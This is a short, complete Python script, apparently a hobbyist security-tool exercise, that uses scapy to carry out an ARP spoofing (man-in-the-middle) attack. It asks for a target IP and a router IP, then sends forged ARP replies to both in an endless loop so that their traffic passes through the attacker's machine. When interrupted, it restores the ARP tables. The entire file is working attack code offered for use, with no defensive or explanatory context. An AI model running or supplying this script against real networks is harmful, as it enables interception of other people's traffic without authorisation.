#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(
        arp_request_broadcast, timeout=2, verbose=False)[0]

    try:
        return answered_list[0][1].hwsrc
    except:
        pass


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



target_ip = input("[+] Enter the IP of the target device : ")
router_ip = input("[+] Enter the IP of the gateway(router) : ")


sent_packets_count = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent : " + str(sent_packets_count),
              end='')
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CNTRL+C.\n[+] Resetting ARP tables.")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[+]Finished.\n[+] Quitting.")
    exit()
